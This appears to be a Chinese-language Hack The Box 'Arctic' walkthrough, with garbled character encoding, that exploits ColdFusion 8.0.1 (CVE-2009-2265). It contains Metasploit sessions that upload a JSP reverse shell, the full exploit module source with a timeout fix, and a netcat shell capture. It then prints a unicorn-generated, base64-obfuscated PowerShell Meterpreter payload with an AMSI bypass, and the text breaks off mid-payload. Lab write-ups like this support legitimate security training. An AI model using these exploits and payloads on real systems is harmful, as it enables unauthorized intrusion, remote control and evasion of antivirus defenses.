2018-09-11 excellent No Adobe ColdFusion CKEditor unrestricted file upload 1 exploit/multi/http/coldfusion_rds_auth_bypass 2013-08-08 great Yes Adobe ColdFusion RDS Authentication Bypass 2 auxiliary/scanner/http/adobe_xml_inject normal No Adobe XML External Entity Injection 3 auxiliary/gather/coldfusion_pwd_props 2013-05-07 normal Yes ColdFusion &#39;password.properties&#39; Hash Extraction 4 exploit/windows/http/coldfusion_fckeditor 2009-07-03 excellent No ColdFusion 8.0.1 Arbitrary File Upload and Execute 5 auxiliary/scanner/http/coldfusion_locale_traversal normal No ColdFusion Server Check 6 auxiliary/scanner/http/coldfusion_version normal No ColdFusion Version Scanner 7 exploit/linux/misc/hid_discoveryd_command_blink_on_unauth_rce 2016-03-28 excellent Yes HID discoveryd command_blink_on Unauthenticated RCE Interact with a module by name or index. For example info 7, use 7 or use exploit/linux/misc/hid_discoveryd_command_blink_on_unauth_rce ç›´æ¥ä½¿ç”¨ç¬¬ä¸€ä¸ª ç„¶åå°è¯•æ˜¯å¦å¯ä»¥æˆåŠŸ msf6 &gt; use 4 [*] No payload configured, defaulting to generic/shell_reverse_tcp msf6 exploit(windows/http/coldfusion_fckeditor) &gt; set payload generic/shell_reverse_tcp payload =&gt; generic/shell_reverse_tcp ä½¿ç”¨ç›¸å…³çš„æ¨¡å—ï¼Œå¹¶ä¸”è®¾ç½®å¥½æ”»å‡»æ¨¡å— msf6 exploit(windows/http/coldfusion_fckeditor) &gt; show options Module options (exploit/windows/http/coldfusion_fckeditor): Name Current Setting Required Description ---- --------------- -------- ----------- FCKEDITOR_DIR /CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm no The path to upload.cfm Proxies no A proxy chain of format type:host:port[,type:host:port][...] RHOSTS yes The target host(s), range CIDR identifier, or hosts file with syntax &#39;file:&lt;path&gt;&#39; RPORT 80 yes The target port (TCP) SSL false no Negotiate SSL/TLS for outgoing connections VHOST no HTTP server virtual host Payload options (generic/shell_reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- LHOST 192.168.200.128 yes The listen address (an interface may be specified) LPORT 4444 yes The listen port Exploit target: Id Name -- ---- 0 Universal Windows Target è¿™æ˜¯éœ€è¦è®¾ç½®çš„å‚æ•° msf6 exploit(windows/http/coldfusion_fckeditor) &gt; set rhosts 10.10.10.11 rhosts =&gt; 10.10.10.11 msf6 exploit(windows/http/coldfusion_fckeditor) &gt; set rport 8500 rport =&gt; 8500 msf6 exploit(windows/http/coldfusion_fckeditor) &gt; set lhost 10.10.16.4 lhost =&gt; 10.10.16.4 msf6 exploit(windows/http/coldfusion_fckeditor) &gt; show options Module options (exploit/windows/http/coldfusion_fckeditor): Name Current Setting Required Description ---- --------------- -------- ----------- FCKEDITOR_DIR /CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm no The path to upload.cfm Proxies no A proxy chain of format type:host:port[,type:host:port][...] RHOSTS 10.10.10.11 yes The target host(s), range CIDR identifier, or hosts file with syntax &#39;file:&lt;path&gt;&#39; RPORT 8500 yes The target port (TCP) SSL false no Negotiate SSL/TLS for outgoing connections VHOST no HTTP server virtual host Payload options (generic/shell_reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- LHOST 10.10.16.4 yes The listen address (an interface may be specified) LPORT 4444 yes The listen port Exploit target: Id Name -- ---- 0 Universal Windows Target è®¾ç½®å¥½ç›¸å…³çš„å‚æ•°åï¼Œexploit æ‰§è¡Œ msf6 exploit(windows/http/coldfusion_fckeditor) &gt; exploit [*] Started reverse TCP handler on 10.10.16.4:4444 [*] Sending our POST request... [-] Upload Failed... [*] Exploit completed, but no session was created. è¿™ä¸ª exploit åœ¨æ‰§è¡Œåå‡ ä¹å°±ç§’å¤±è´¥äº†ï¼Œè¿™æ˜¯æœ‰é—®é¢˜çš„ï¼Œå› ä¸ºè¿™ä¸ªç½‘ç«™ä¸ç®¡æ‰§è¡Œä»€ä¹ˆï¼Œéƒ½åº”è¯¥æœ‰ä¸ªå¤§çº¦ 30 ç§’å·¦å³çš„ç¼“å†²ï¼Œæˆ‘ä»¬æ£€æŸ¥ä¸€ä¸‹åŸå›  msf6 exploit(windows/http/coldfusion_fckeditor) &gt; show advanced Module advanced options (exploit/windows/http/coldfusion_fckeditor): Name Current Setting Required Description ---- --------------- -------- ----------- ContextInformationFile no The information file that contains context information DOMAIN WORKSTATION yes The domain to use for Windows authentication DigestAuthIIS true no Conform to IIS, should work for most servers. Only set to false for non-IIS servers DisablePayloadHandler false no Disable the handler code for the selected payload EnableContextEncoding false no Use transient context when encoding payloads FingerprintCheck true no Conduct a pre-exploit fingerprint verification HttpClientTimeout no HTTP connection and receive timeout HttpPassword no The HTTP password to specify for authentication HttpRawHeaders no Path to ERB-templatized raw headers to append to existing headers HttpTrace false no Show the raw HTTP requests and responses HttpTraceColors red/blu no HTTP request and response colors for HttpTrace (unset to disable) HttpTraceHeadersOnly false no Show HTTP headers only in HttpTrace HttpUsername no The HTTP username to specify for authentication SSLVersion Auto yes Specify the version of SSL/TLS to be used (Auto, TLS and SSL23 are auto-negotiate) (Accepted: Auto, TLS, SSL23, SSL3, TLS 1, TLS1.1, TLS1.2) UserAgent Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1) no The User-Agent header to use for all requests VERBOSE false no Enable detailed status messages WORKSPACE no Specify the workspace for this module WfsDelay 2 no Additional delay in seconds to wait for a session Payload advanced options (generic/shell_reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- ARCH no The architecture that is being targeted PLATFORM no The platform that is being targeted ReverseAllowProxy false yes Allow reverse tcp even with Proxies specified. Connect back will NOT go through proxy but directly to LHOST ReverseListenerBindAddress no The specific IP address to bind to on the local system ReverseListenerBindPort no The port to bind to on the local system if different from LPORT ReverseListenerComm no The specific communication channel to use for this listener ReverseListenerThreaded false yes Handle every connection in a new thread (experimental) StagerRetryCount 10 no The number of times the stager should retry if the first connect fails StagerRetryWait 5 no Number of seconds to wait for the stager between reconnect attempts VERBOSE false no Enable detailed status messages WORKSPACE no Specify the workspace for this module msf6 exploit(windows/http/coldfusion_fckeditor) &gt; set VERBOSE TRUE VERBOSE =&gt; true æˆ‘ä»¬å°† VERBOSE è®¾ç½®ä¸º TRUE ç„¶åå†æ‰§è¡Œ msf6 exploit(windows/http/coldfusion_fckeditor) &gt; exploit [*] Started reverse TCP handler on 10.10.16.4:4444 [*] Sending our POST request... [-] Upload Failed... [*] Exploit completed, but no session was created. ç„¶åæ‰§è¡Œåè¿˜æ˜¯æ²¡æœ‰å¾—åˆ°ç›¸å…³çš„ä¿¡æ¯ï¼Œä»¥åŠè¯¦ç»†æƒ…å†µï¼Œæˆ‘ä»¬æŠ“ä¸ªåŒ…çœ‹çœ‹å†…å®¹ æ·»åŠ ä¸€ä¸ªæ–°çš„ä»£ç†ï¼Œè®¾ç½®ç«¯å£ä¸º 8500ï¼Œå¹¶å°†æµé‡è½¬å‘åˆ° 10.10.10.11çš„ 8500 ç«¯å£ æˆ‘ä»¬åˆ‡æ¢å¥½ä»£ç†ï¼Œç„¶åå»æ‰§è¡Œ æˆåŠŸæŠ“åˆ°äº† payload å†…å®¹ æˆ‘ä»¬å‘é€åˆ° repeaterï¼Œç„¶åæ‰§è¡Œ åœ¨ä¸‹é¢å¯ä»¥çœ‹åˆ°ï¼Œæœ‰ä¸€æ®µå‘½ä»¤æ˜¯å‘æˆ‘ä»¬çš„ ip å’Œç«¯å£å›å¼¹ä¸€ä¸ªshellï¼Œä½†æ˜¯è¢«ä¸Šé¢çš„ 00 æˆªæ–­è¿˜æ˜¯ä»€ä¹ˆç©æ„å„¿çš„ç»™æˆªæ–­äº†è¿˜æ˜¯å§å•¦å§å•¦çš„ï¼Œåæ­£å°±æ˜¯æ²¡æ‰§è¡ŒæˆåŠŸï¼Œä½†æ˜¯æ–‡ä»¶åº”è¯¥ä¸Šå»äº†ã€‚åœ¨æœ¬åœ°ä½¿ç”¨ nc ç›‘å¬ä¸€ä¸ªç«¯å£ï¼Œç„¶åæ‰‹åŠ¨è®¿é—®ä¸€ä¸‹æˆ‘ä»¬ä¸Šä¼ çš„æ–‡ä»¶ â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# nc -nvlp 4444 listening on [any] 4444 ... http://10.10.10.11:8500/userfiles/file/MMJPPXXEPA.jsp ç„¶åç­‰å¾… 30 ç§’ â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# nc -nvlp 4444 listening on [any] 4444 ... connect to [10.10.16.4] from (UNKNOWN) [10.10.10.11] 49440 Microsoft Windows [Version 6.1.7600] Copyright (c) 2009 Microsoft Corporation. All rights reserved. C:\\ColdFusion8\\runtime\\bin&gt;whoami whoami arctic\\tolis æˆåŠŸæ‹¿åˆ°ä¸€ä¸ª shell C:\\Users\\tolis\\Desktop&gt;cd C:\\Users\\tolis\\Desktop cd C:\\Users\\tolis\\Desktop C:\\Users\\tolis\\Desktop&gt;type user.txt type user.txt b30ff1922f046d55ccb4b125ea8f1539 æˆåŠŸæ‹¿åˆ°ä¸€ä¸ª user æƒé™çš„ flag æ–‡ä»¶ Msf ä¿®å¤æŸ¥æ‰¾ä¸€ä¸‹ windows&#x2F;http&#x2F;coldfusion_fckeditor çš„åœ°å€ â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# locate windows/http/coldfusion_fckeditor 1 â¨¯ /usr/share/metasploit-framework/modules/exploits/windows/http/coldfusion_fckeditor.rb æŸ¥çœ‹ä¸€ä¸‹ â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# cat /usr/share/metasploit-framework/modules/exploits/windows/http/coldfusion_fckeditor.rb ## # This module requires Metasploit: https://metasploit.com/download # Current source: https://github.com/rapid7/metasploit-framework ## class MetasploitModule &lt; Msf::Exploit::Remote Rank = ExcellentRanking include Msf::Exploit::Remote::HttpClient def initialize(info = {}) super(update_info(info, &#39;Name&#39; =&gt; &#39;ColdFusion 8.0.1 Arbitrary File Upload and Execute&#39;, &#39;Description&#39; =&gt; %q{ This module exploits the Adobe ColdFusion 8.0.1 FCKeditor &#39;CurrentFolder&#39; File Upload and Execute vulnerability. }, &#39;Author&#39; =&gt; [ &#39;MC&#39; ], &#39;License&#39; =&gt; MSF_LICENSE, &#39;Platform&#39; =&gt; &#39;win&#39;, &#39;Privileged&#39; =&gt; true, &#39;References&#39; =&gt; [ [ &#39;CVE&#39;, &#39;2009-2265&#39; ], [ &#39;OSVDB&#39;, &#39;55684&#39;], ], &#39;Targets&#39; =&gt; [ [ &#39;Universal Windows Target&#39;, { &#39;Arch&#39; =&gt; ARCH_JAVA, &#39;Payload&#39; =&gt; { &#39;DisableNops&#39; =&gt; true, }, } ], ], &#39;DefaultOptions&#39; =&gt; { &#39;SHELL&#39; =&gt; &#39;cmd.exe&#39; }, &#39;DefaultTarget&#39; =&gt; 0, &#39;DisclosureDate&#39; =&gt; &#39;2009-07-03&#39; )) register_options( [ OptString.new(&#39;FCKEDITOR_DIR&#39;, [ false, &#39;The path to upload.cfm &#39;, &#39;/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm&#39; ]), ]) end def exploit page = rand_text_alpha_upper(rand(10) + 1) + &quot;.jsp&quot; dbl = Rex::MIME::Message.new dbl.add_part(payload.encoded, &quot;application/x-java-archive&quot;, nil, &quot;form-data; name=\\&quot;newfile\\&quot;; filename=\\&quot;#{rand_text_alpha_upper(8)}.txt\\&quot;&quot;) file = dbl.to_s file.strip! print_status(&quot;Sending our POST request...&quot;) res = send_request_cgi( { &#39;uri&#39; =&gt; normalize_uri(datastore[&#39;FCKEDITOR_DIR&#39;]), &#39;query&#39; =&gt; &quot;Command=FileUpload&amp;Type=File&amp;CurrentFolder=/#{page}%00&quot;, &#39;version&#39; =&gt; &#39;1.1&#39;, &#39;method&#39; =&gt; &#39;POST&#39;, &#39;ctype&#39; =&gt; &#39;multipart/form-data; boundary=&#39; + dbl.bound, &#39;data&#39; =&gt; file, }, 5) if ( res and res.code == 200 and res.body =~ /OnUploadCompleted/ ) print_status(&quot;Upload succeeded! Executing payload...&quot;) send_request_raw( { # default path in Adobe ColdFusion 8.0.1. &#39;uri&#39; =&gt; &#39;/userfiles/file/&#39; + page, &#39;method&#39; =&gt; &#39;GET&#39;, }, 5) handler else print_error(&quot;Upload Failed...&quot;) return end end end è¿™é‡Œå°† 74 è¡Œå’Œ 84 è¡Œçš„ç­‰å¾… 5 ç§’æ›´æ¢ä¸ºç­‰å¾… 25 ç§’å³å¯æˆåŠŸä½¿ç”¨ æƒé™æå‡å¤±è´¥çš„æ–¹æ³• https://github.com/trustedsec/unicorn è¿™é‡Œä½¿ç”¨ unicorn å·¥å…·åå‘ä¸€ä¸ª Meterpreter çš„ shell å›æ¥ ä½¿ç”¨ unicorn ç”Ÿæˆä¸€ä¸‹ â”Œâ”€â”€(rootğŸ’€kali)-[~/â€¦/HTB/Easy/Arctic/unicorn] â””â”€# ./unicorn.py windows/meterpreter/reverse_tcp 10.10.16.4 5555 ç„¶åä¼šç”Ÿæˆä¸¤ä¸ªæ–‡ä»¶ â”Œâ”€â”€(rootğŸ’€kali)-[~/â€¦/HTB/Easy/Arctic/unicorn] â””â”€# cat unicorn.rc use multi/handler set payload windows/meterpreter/reverse_tcp set LHOST 10.10.16.4 set LPORT 5555 set ExitOnSession false set AutoVerifySession false set AutoSystemInfo false set AutoLoadStdapi false exploit -j ä¸€ä¸ªæ˜¯åŠ è½½ç›‘å¬å™¨çš„æ‰€æœ‰å‘½ä»¤ â”Œâ”€â”€(rootğŸ’€kali)-[~/â€¦/HTB/Easy/Arctic/unicorn] â””â”€# cat powershell_attack.txt # AMSI bypass code - run in same process as unicorn second stage powershell /w 1 /C &quot;sv PWA -;sv es ec;sv xo ((gv PWA).value.toString()+(gv es).value.toString());powershell (gv xo).value.toString() (&#39;JABWAGUAbABqAG4AIAA9ACAAQAAiAAoAdQBzAGkAbgBnACAAUwB5AHMAdABlAG0AOwB1AHMAaQBuAGcAIABTAHkAcwB0AGUAbQAuAFIAdQBuAHQAaQBtAGUALgBJAG4AdABlAHIAbwBwAFMAZQByAHYAaQBjAGUAcwA7AHAAdQBiAGwAaQBjACAAYwBsAGEAcwBzACAAVwBpAG4AMwAyACAAewBbAEQAbABsAEkAbQBwAG8AcgB0ACgAIgBrAGUAIgArACIAcgAiACsAIgBuAGUAbAAzADIAIgApAF0AcAB1AGIAbABpAGMAIABzAHQAYQB0AGkAYwAgAGUAeAB0AGUAcgBuACAASQBuAHQAUAB0AHIAIABHAGUAdABQAHIAbwBjAEEAZABkAHIAZQBzAHMAKABJAG4AdABQAHQAcgAgAGgATQBvAGQAdQBsAGUALAAgAHMAdAByAGkAbgBnACAAcAByAG8AYwBOAGEAbQBlACkAOwBbAEQAbABsAEkAbQBwAG8AcgB0ACgAIgBrAGUAIgArACIAcgAiACsAIgBuAGUAbAAzADIAIgApAF0AIABwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAAZQB4AHQAZQByAG4AIABJAG4AdABQAHQAcgAgAEwAbwBhAGQATABpAGIAcgBhAHIAeQAoAHMAdAByAGkAbgBnACAAbgBhAG0AZQApADsAWwBEAGwAbABJAG0AcABvAHIAdAAoACIAawBlACIAKwAiAHIAIgArACIAbgBlAGwAMwAyACIAKQBdACAAcAB1AGIAbABpAGMAIABzAHQAYQB0AGkAYwAgAGUAeAB0AGUAcgBuACAAYgBvAG8AbAAgAFYAaQByAHQAdQBhAGwAUAByAG8AdABlAGMAdAAoAEkAbgB0AFAAdAByACAAbABwAEEAZABkAHIAZQBzAHMALAAgAFUASQBuAHQAUAB0AHIAIABkAHcAUwBpAHoAZQAsACAAdQBpAG4AdAAgAGYAbABOAGUAdwBQAHIAbwB0AGUAYwB0ACwAIABvAHUAdAAgAHUAaQBuAHQAIABsAHAAZgBsAE8AbABkAFAAcgBvAHQAZQBjAHQAKQA7AH0ACgAiAEAACgBBAGQAZAAtAFQAeQBwAGUAIAAkAFYAZQBsAGoAbgA7ACQAbQBFAE4AYQBiAGkAIAA9ACAAWwBXAGkAbgAzADIAXQA6ADoARwBlAHQAUAByAG8AYwBBAGQAZAByAGUAcwBzACgAWwBXAGkAbgAzADIAXQA6ADoATABvAGEAZABMAGkAYgByAGEAcgB5ACgAIgBBACIAKwAiAG0AIgArACIAcwBpAC4AZAAiACsAIgBsACIAKwAiAGwAIgApACwAIAAiAEEAIgArACIAbQAiACsAIgBzAGkAUwBjAGEAbgBCAHUAZgBmACIAKwAiAGUAIgArACIAcgAiACkAOwAkAE8AbQBSAGMAaQBpAHUAUwBlAFUAIAA9ACAAMAA7AFsAVwBpAG4AMwAyAF0AOgA6AFYAaQByAHQAdQBhAGwAUAByAG8AdABlAGMAdAAoACQAbQBFAE4AYQBiAGkALAAgAFsAdQBpAG4AdAAzADIAXQBbAHUAaQBuAHQAMwAyAF0ANQAsACAAMAB4ADQAMAAsACAAWwByAGUAZgBdACQATwBtAFIAYwBpAGkAdQBTAGUAVQApADsAJABIAFUAQQBRAFQAVABrACAAPQAgACgAIgB9AHgAZgBaAGYAeABsAHUAUgAsACAAfQB4AGkAagBYAGgASwB0AE8ALAAgAH0AeAB9AH0ALAAgAH0AeAB9ADcALAAgAH0AeAA4AH0ALAAgAH0AeABDADMAIgApAC4AcgBlAHAAbABhAGMAZQAoACIAaQBqAFgAaABLAHQATwAiACwAIAAiADUANwAiACkALgByAGUAcABsAGEAYwBlACgAIgB9ACIALAAgACIAMAAiACkALgByAGUAcABsAGEAYwBlACgAIgBmAFoAZgB4AGwAdQBSACIALAAgACIAQgA4ACIAKQA7ACQASABVAEEAUQBUAFQAawAgAD0AIABbAEIAeQB0AGUAWwBdAF0AKAAkAEgAVQBBAFEAVABUAGsAKQAuAHMAcABsAGkAdAAoACIALAAiACkAOwBbAFMAeQBzAHQAZQBtAC4AUgB1AG4AdABpAG0AZQAuAEkAbgB0AGUAcgBvAHAAUwBlAHIAdgBpAGMAZQBzAC4ATQBhAHIAcwBoAGEAbABdADoAOgBDAG8AcAB5ACgAJABIAFUAQQBRAFQAVABrACwAIAAwACwAIAAkAG0ARQBOAGEAYgBpACwAIAA2ACkA&#39;)&quot; # actual unicorn payload powershell /w 1 /C &quot;sv PWA -;sv es ec;sv xo ((gv PWA).value.toString()+(gv es).value.toString());powershell (gv xo).value.toString() (&#39;JABUAEYAPQAnACQAcABMAD0AJwAnAFsARABsAGwASQBtAHAAbwByAHQAKAAoACIAbQBzAHYAYwByAHQALgBkAGwAIgArACIAbAAiACsAIgAiACkAKQBdAHAAdQBiAGwAaQBjACAAcwB0AGEAdABpAGMAIABlAHgAdABlAHIAbgAgAEkAbgB0AFAAdAByACAAYwBhAGwAbABvAGMAKAB1AGkAbgB0ACAAZAB3AFMAaQB6AGUALAAgAHUAaQBuAHQAIABhAG0AbwB1AG4AdAApADsAWwBEAGwAbABJAG0AcABvAHIAdAAoACIAawBlAHIAbgBlAGwAMwAyAC4AZABsACIAKwAiAGwAIgArACIAIgApAF0AcAB1AGIAbABpAGMAIABzAHQAYQB0AGkAYwAgAGUAeAB0AGUAcgBuACAASQBuAHQAUAB0AHIAIABDAHIAZQBhAHQAZQBUAGgAcgBlAGEAZAAoAEkAbgB0AFAAdAByACAAbABwAFQAaAByAGUAYQBkAEEAdAB0AHIAaQBiAHUAdABlAHMALAAgAHUAaQBuAHQAIABkAHcAUwB0AGEAYwBrAFMAaQB6AGUALAAgAEkAbgB0AFAAdAByACAAbABwAFMAdABhAHIAdABBAGQAZAByAGUAcwBzACwAIABJAG4AdABQAHQAcgAgAGwAcABQAGEAcgBhAG0AZQB0AGUAcgAsACAAdQBpAG4AdAAgAGQAdwBDAHIAZQBhAHQAaQBvAG4ARgBsAGEAZwBzACwAIABJAG4AdABQAHQAcgAgAGwAcABUAGgAcgBlAGEAZABJAGQAKQA7AFsARABsAGwASQBtAHAAbwByAHQAKAAiAGsAZQByAG4AZQBsADMAMgAuAGQAbAAiACsAIgBsACIAKwAiACIAKQBdAHAAdQBiAGwAaQBjACAAcwB0AGEAdABpAGMAIABlAHgAdABlAHIAbgAgAEkAbgB0AFAAdAByACAAVgBpAHIAdAB1AGEAbABQAHIAbwB0AGUAYwB0ACgASQBuAHQAUAB0AHIAIABsAHAAUwB0AGEAcgB0AEEAZABkAHIAZQBzAHMALAAgAHUAaQBuAHQAIABkAHcAUwBpAHoAZQAsACAAdQBpAG4AdAAgAGYAbABOAGUAdwBQAHIAbwB0AGUAYwB0ACwAIABvAHUAdAAgAHUAaQBuAHQAIABGAG0ATAApADsAWwBEAGwAbABJAG0AcABvAHIAdAAoACIAbQBzAHYAYwByAHQALgBkAGwAIgArACIAbAAiACsAIgAiACkAXQBwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAAZQB4AHQAZQByAG4AIABJAG4AdABQAHQAcgAgAG0AZQBtAHMAZQB0ACgASQBuAHQAUAB0AHIAIABkAGUAcwB0ACwAIAB1AGkAbgB0ACAAcwByAGMALAAgAHUAaQBuAHQAIABjAG8AdQBuAHQAKQA7ACcAJwA7ACQAUwBPAD0AIgB9AGUAOAAsAH0AOABmACwAfQAwADAALAB9ADAAMAAsAH0AMAAwACwAfQA2ADAALAB9ADMAMQAsAH0AZAAyACwAfQA2ADQALAB9ADgAYgAsAH0ANQAyACwAfQAzADAALAB9ADgAYgAsAH0ANQAyACwAfQAwAGMALAB9ADgAYgAsAH0ANQAyACwAfQAxADQALAB9ADgAOQAsAH0AZQA1ACwAfQAzADEALAB9AGYAZgAsAH0AOABiACwAfQA3ADIALAB9ADIAOAAsAH0AMABmACwAfQBiADcALAB9ADQAYQAsAH0AMgA2ACwAfQAzADEALAB9AGMAMAAsAH0AYQBjACwAfQAzAGMALAB9ADYAMQAsAH0ANwBjACwAfQAwADIALAB9ADIAYwAsAH0AMgAwACwAfQBjADEALAB9AGMAZgAsAH0AMABkACwAfQAwADEALAB9AGMANwAsAH0ANAA5ACwAfQA3ADUALAB9AGUAZgAsAH0ANQAyACwAfQA1ADcALAB9ADgAYgAsAH0ANQAyACwAfQAxADAALAB9ADgAYgAsAH0ANAAyACwAfQAzAGMALAB9ADAAMQAsAH0AZAAwACwAfQA4AGIALAB9ADQAMAAsAH0ANwA4ACwAfQA4ADUALAB9AGMAMAAsAH0ANwA0ACwAfQA0AGMALAB9ADAAMQAsAH0AZAAwACwAfQA4AGIALAB9ADQAOAAsAH0AMQA4ACwAfQA4AGIALAB9ADUAOAAsAH0AMgAwACwAfQA1ADAALAB9ADAAMQAsAH0AZAAzACwAfQA4ADUALAB9AGMAOQAsAH0ANwA0ACwAfQAzAGMALAB9ADMAMQAsAH0AZgBmACwAfQA0ADkALAB9ADgAYgAsAH0AMwA0ACwAfQA4AGIALAB9ADAAMQAsAH0AZAA2ACwAfQAzADEALAB9AGMAMAAsAH0AYwAxACwAfQBjAGYALAB9ADAAZAAsAH0AYQBjACwAfQAwADEALAB9AGMANwAsAH0AMwA4ACwAfQBlADAALAB9ADcANQAsAH0AZgA0ACwAfQAwADMALAB9ADcAZAAsAH0AZgA4ACwAfQAzAGIALAB9ADcAZAAsAH0AMgA0ACwAfQA3ADUALAB9AGUAMAAsAH0ANQA4ACwAfQA4AGIALAB9ADUAOAAsAH0AMgA0ACwAfQAwADEALAB9AGQAMwAsAH0ANgA2ACwAfQA4AGIALAB9ADAAYwAsAH0ANABiACwAfQA4AGIALAB9ADUAOAAsAH0AMQBjACwAfQAwADEALAB9AGQAMwAsAH0AOABiACwAfQAwADQALAB9ADgAYgAsAH0AMAAxACwAfQBkADAALAB9ADgAOQAsAH0ANAA0ACwAfQAyADQALAB9ADIANAAsAH0ANQBiACwAfQA1AGIALAB9ADYAMQAsAH0ANQA5ACwAfQA1AGEALAB9ADUAMQAsAH0AZgBmACwAfQBlADAALAB9ADUAOAAsAH0ANQBmACwAfQA1AGEALAB9ADgAYgAsAH0AMQAyACwAfQBlADkALAB9ADgAMAAsAH0AZgBmACwAfQBmAGYALAB9AGYAZgAsAH0ANQBkACwAfQA2ADgALAB9ADMAMwAsAH0AMwAyACwAfQAwADAALAB9ADAAMAAsAH0ANgA4ACwAfQA3ADcALAB9ADcAMwAsAH0AMwAyACwAfQA1AGYALAB9ADUANAAsAH0ANgA4ACwAfQA0AGMALAB9ADcANwAsAH0AMgA2ACwAfQAwADcALAB9ADgAOQAsAH0AZQA4ACwAfQBmAGYALAB9AGQAMAAsAH0AYgA4ACwAfQA5ADAALAB9ADAAMQAsAH0AMAAwACwAfQAwADAALAB9ADIAOQAsAH0AYwA0ACwAfQA1ADQALAB9ADUAMAAsAH0ANgA4ACwAfQAyADkALAB9ADgAMAAsAH0ANgBiACwAfQAwADAALAB9AGYAZgAsAH0AZAA1ACwAfQA2AGEALAB9ADAAYQAsAH0ANgA4ACwAfQAwAGEALAB9ADAAYQAsAH0AMQAwACwAfQAwADQALAB9ADYAOAAsAH0AMAAyACwAfQAwADAALAB9ADEANQAsAH0AYgAzACwAfQA4ADkALAB9AGUANgAsAH0ANQAwACwAfQA1ADAALAB9ADUAMAAsAH0ANQAwACwAfQA0ADAALAB9ADUAMAAsAH0ANAAwACwAfQA1ADAALAB9ADYAOAAsAH0AZQBhACwAfQAwAGYALAB9AGQAZgAsAH0AZQAwACwAfQBmAGYALAB9AGQANQAsAH0AOQA3ACwAfQA2AGEALAB9ADEAMAAsAH0ANQA2ACwAfQA1ADcALAB9ADYAOAAsAH0AOQA5ACwAfQBhADUALAB9ADcANAAsAH0ANgAxACwAfQBmAGYALAB9AGQANQAsAH0AOAA1ACwAfQBjADAALAB9ADcANAAsAH0AMABjACwAfQBmAGYALAB9ADQAZQAsAH0AMAA4ACwAfQA3ADUALAB9AGUAYwAsAH0ANgA4ACwAfQBmADAALAB9AGIANQAsAH0AYQAyACwAfQA1ADYALAB9AGYAZgAsAH0AZAA1ACwAfQA2AGEALAB9ADAAMAAsAH0ANgBhACwAfQAwADQALAB9ADUANgAsAH0ANQA3ACwAfQA2ADgALAB9ADAAMgAsAH0AZAA5ACwAfQBjADgALAB9ADUAZgAsAH0AZgBmACwAfQBkADUALAB9ADgAYgAsAH0AMwA2ACwAfQA2AGEALAB9ADQAMAAsAH0ANgA4ACwAfQAwADAALAB9ADEAMAAsAH0AMAAwACwAfQAwADAALAB9ADUANgAsAH0ANgBhACwAfQAwADAALAB9ADYAOAAsAH0ANQA4ACwAfQBhADQALAB9ADUAMwAsAH0AZQA1ACwAfQBmAGYALAB9AGQANQAsAH0AOQAzACwAfQA1ADMALAB9ADYAYQAsAH0AMAAwACwAfQA1ADYALAB9ADUAMwAsAH0ANQA3ACwAfQA2ADg&#39;+&#39;ALAB9ADAAMgAsAH0AZAA5ACwAfQBjADgALAB9ADUAZgAsAH0AZgBmACwAfQBkADUALAB9ADAAMQAsAH0AYwAzACwAfQAyADkALAB9AGMANgAsAH0ANwA1ACwAfQBlAGUALAB9AGMAMwAiADsAJABrAEoAPQBBAGQAZAAtAFQAeQBwAGUAIAAtAHAAYQBzAHMAIAAtAG0AIAAkAHAATAAgAC0ATgBhAG0AZQAgACIAbQBzACIAIAAtAG4AYQBtAGUAcwAgAEkAYgBFADsAJABrAEoAPQAkAGsASgAuAHIAZQBwAGwAYQBjAGUAKAAiAEkAYgBFACIALAAgACIAVwBpAG4AMwAyAEYAdQBuACIAKwAiAGMAIgArACIAdABpAG8AbgBzACIAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAFMATwAgAD0AIAAkAFMATwAuAHIAZQBwAGwAYQBjAGUAKAAiAH0AIgAsACIAdwBpAFIAeAAiACkALgByAGUAcABsAGEAYwBlACgAIgB3AGkAUgAiACwAIAAiADAAIgApAC4AUwBwAGwAaQB0ACgAIgAsACIAKQA7ACQAQgBnAD0AMAB4ADEAMAAwADYAOwBpAGYAIAAoACQAUwBPAC4ATAAgAC0AZwB0ACAAMAB4ADEAMAAwADYAKQB7ACQAQgBnAD0AJABTAE8ALgBMAH0AOwAkAGwAUAA9ACQAawBKADoAOgBjAGEAbABsAG8AYwAoADAAeAAxADAAMAA2ACwAIAAxACkAOwBbAFUASQBuAHQANgA0AF0AJABGAG0ATAAgAD0AIAAwADsAZgBvAHIAKAAkAEIAQQA9ADAAOwAkAEIAQQAgAC0AbABlACgAJABTAE8ALgBMAGUAbgBnAHQAaAAtADEAKQA7ACQAQgBBACsAKwApAHsAJABrAEoAOgA6AG0AZQBtAHMAZQB0ACgAWwBJAG4AdABQAHQAcgBdACgAJABsAFAALgBUAG8ASQBuAHQAMwAyACgAKQArACQAQgBBACkALAAgACQAUwBPAFsAJABCAEEAXQAsACAAMQApAH0AOwAkAGsASgA6ADoAVgBpAHIAdAB1AGEAbABQAHIAbwB0AGUAYwB0ACgAJABsAFAALAAgADAAeAAxADAAMAA2ACwAIAAwAHgANAAwACwAIABbAFIAZQBmAF0AJABGAG0ATAApADsAJABZAFoASgA9AFsAaQBuAHQAXQAwAHgAMAAwADsAJABrAEoAOgA6AEMAcgBlAGEAdABlAFQAaAByAGUAYQBkACgAWwBpAG4AdABdADAALAAkAFkAWgBKACwAJABsAFAALAAwACwAMAAsADEALQAxACkAOwAnADsAJABJAFgAPQBbAEMAbwBuAHYAZQByAHQAXQA6ADoAVABvAEIAYQBzAGUANgA0AFMAdAByAGkAbgBnACgAWwBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AFUAbgBpAGMAbwBkAGUALgBHAGUAdABCAHkAdABlAHMAKAAkAFQARgApACkAOwAkAE4ATQA9ACIAcABvAHcAZQByAHMAaABlAGwAbAAiADsAJABIAEsAPQAiAFcAa